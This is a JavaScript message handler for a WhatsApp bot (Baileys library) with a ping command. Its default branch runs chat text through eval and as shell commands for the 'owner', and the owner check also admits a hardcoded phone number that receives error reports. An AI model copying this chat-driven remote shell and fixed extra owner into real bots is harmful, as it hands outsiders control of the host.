import {
    BufferJSON,
    fetchLatestBaileysVersion,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    delay,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getDevice,
    getContentType,
    downloadContentFromMessage
} from "@whiskeysockets/baileys";

import { color, bgcolor } from "../lib/color.js";
import fs from "fs";
import ms from "parse-ms";
import axios from 'axios';
import * as cheerio from "cheerio";
import crypto from 'crypto';
import toMs from "ms";
import { Jimp } from "jimp";
import os from 'os';
import path from 'path';
import { fileURLToPath } from 'url';
import logg from 'pino';
import moment from "moment-timezone";
import util from "util";
import { getLinkPreview, getPreviewFromContent } from "link-preview-js";
import fetch from 'node-fetch';
import { exec, spawn } from "child_process";
import chalk from 'chalk';
import cp from 'child_process';
import speed from 'performance-now';
import { promisify } from 'util';
import setting from '../lib/settings.json' with { type: 'json' };
const { ownerNumber, prefix: defaultPrefix } = setting;
import { 
    serialize, getBuffer, fetchJson, fetchText, getRandom,
    getGroupAdmins, runtime, runtime2, sleep, generateProfilePicture,
    makeid, makeid2, removeEmojis, calculate_age, bytesToSize, checkBandwidth 
} from "../lib/myfunc.js";

import { 
    smsg, formatp, tanggal, formatDate, getTime, isUrl, 
    clockString, jsonformat, parseMention, reSize 
} from "../lib/otherfunc.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

moment.tz.setDefault("Asia/Jakarta").locale("id");

export default async ( karr, msg, m) => {
    try {
        const { type, isQuotedMsg, quotedMsg, mentioned, now, fromMe, isBaileys } = msg;
        const toJSON = (j) => JSON.stringify(j, null, "\t");
                const from = msg.key.remoteJid;
        var chats = (type === 'senderKeyDistributionMessage') ? msg.message.conversation : (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
          if (chats == undefined) { chats = '' }
        const args = chats.split(" ");
        const botNumber = karr.user.id.split(":")[0] + "@s.whatsapp.net";
        const command = chats.toLowerCase().split(" ")[0] || "";
        const isGroup = msg.key.remoteJid.endsWith("@g.us");
        const sender = isGroup ? msg.key.participant ? msg.key.participant : msg.participant : msg.key.remoteJid;
        const userId = sender.split("@")[0]
        const isOwner = ownerNumber == sender ? true : ["6285811597011@s.whatsapp.net"].includes(sender) ? true : false;
        const pushname = msg.pushName || "No Name"
        const groupMetadata = isGroup ? await karr.groupMetadata(from) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const groupOwner = isGroup ? groupMetadata.subjectOwner : ''
        const groupId = isGroup ? groupMetadata.id : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
        const isGroupAdmins = groupAdmins.includes(sender)
        let prefix;
        if (karr.multi) {
            prefix = /^[°•π÷×¶∆£•²¢€¥®™✓_=|~!?#%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£•²¢€¥®™✓_=|~!?#%^&.+-,\/\\©^]/gi)[0] : '#'
        } else {
            prefix = karr.nopref ? '' : defaultPrefix;
        }
        const body = chats.startsWith(prefix) ? chats : ''
        const q = chats.slice(command.length + 1, chats.length);
        const text = args.join(' ')
        const budy = chats.toLowerCase()
        const isCmd = chats.startsWith(prefix)
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
        let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
        const ucapanWaktu = "Selamat " + dt.charAt(0).toUpperCase() + dt.slice(1)
        const content = JSON.stringify(msg.message)

        if (fromMe) return

        // --- Utility Functions ---
        const reply = (teks) => {
            return karr.sendMessage(from, { text: teks, mentions: parseMention(teks) }, { quoted: msg, messageId: 'KARUTA_' + makeid(9).toUpperCase() })
        };

        if (msg && !fromMe) {
            console.log('->[\x1b[1;32mPESAN\x1b[1;37m]', color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${chats} [${args.length}]`), 'from', color(pushname), 'in', color(groupName || 'Private Chat'))
        }

        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isSticker = (type == 'stickerMessage')
        const isViewOnce = (type == 'viewOnceMessageV2')
        const isAudio = (type == 'audioMessage')
        const isQuotedImage = isQuotedMsg ? (quotedMsg.type === 'imageMessage') ? true : false : false
        const isQuotedAudio = isQuotedMsg ? (quotedMsg.type === 'audioMessage') ? true : false : false
        const isQuotedDocument = isQuotedMsg ? (quotedMsg.type === 'documentMessage') ? true : false : false
        const isQuotedVideo = isQuotedMsg ? (quotedMsg.type === 'videoMessage') ? true : false : false
        const isQuotedSticker = isQuotedMsg ? (quotedMsg.type === 'stickerMessage') ? true : false : false
        const isQuotedViewOnce = isQuotedMsg ? (quotedMsg.type === 'viewOnceMessageV2') ? true : false : false
        const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
const wait = () => {
karr.sendMessage(from, { react: { text: `⌛`, key: msg.key }})
}
        switch (command) {
//// TARO CASE FITUR NYA DISINI ///
case prefix+'ping':{
var timestamp = speed();
var latensi = speed() - timestamp
reply(`*Pong!!*\nSpeed: ${latensi.toFixed(4)}s`)
}
            default:
                if (chats.startsWith("> ")) {
                    if (!isOwner) return
                    try {
                        reply(util.format(await eval(`(async () => { ${chats.slice(2)} })()`)))
                    } catch (e) {
                        reply(util.format(e))
                    }
                } else if (chats.startsWith("$ ")) {
                    if (!isOwner) return
                    exec(chats.slice(2), (err, stdout) => {
                        if (err) return reply(`${err}`)
                        if (stdout) reply(`${stdout}`)
                    })
                   } else if (chats.startsWith("x ")) {
                     if (!isOwner) return
                       try {
                      let evaled = await eval(chats.slice(2))
                     if (typeof evaled !== 'string') evaled = require("util").inspect(evaled)
                      reply(`${evaled}`)
                     } catch (err) {
                     reply(`${err}`)
                     }
                    } else if (chats.startsWith("< ")) {
                   if (!isOwner) return
                    try {
                   let evaled = await eval(chats.slice(2))
                  if (typeof evaled !== 'string') evaled = require("util").inspect(evaled)
                   reply(`${evaled}`)
                   } catch (err) {
                   reply(`${err}`)
                  }}
        }
    } catch (err) {
        console.log(color('[ERROR]', 'red'), err)
        karr.sendMessage(msg.key.remoteJid, { text: `Maaf terjadi kesalahan` }, { quoted: msg })
        karr.sendMessage('6285811597011@s.whatsapp.net', { text: `*[TERJADI ERROR]*\n${err}` }, { quoted: msg })
    }
};

fs.watchFile(__filename, () => {
    fs.unwatchFile(__filename)
    console.log(chalk.green(`Update ${__filename}`))
})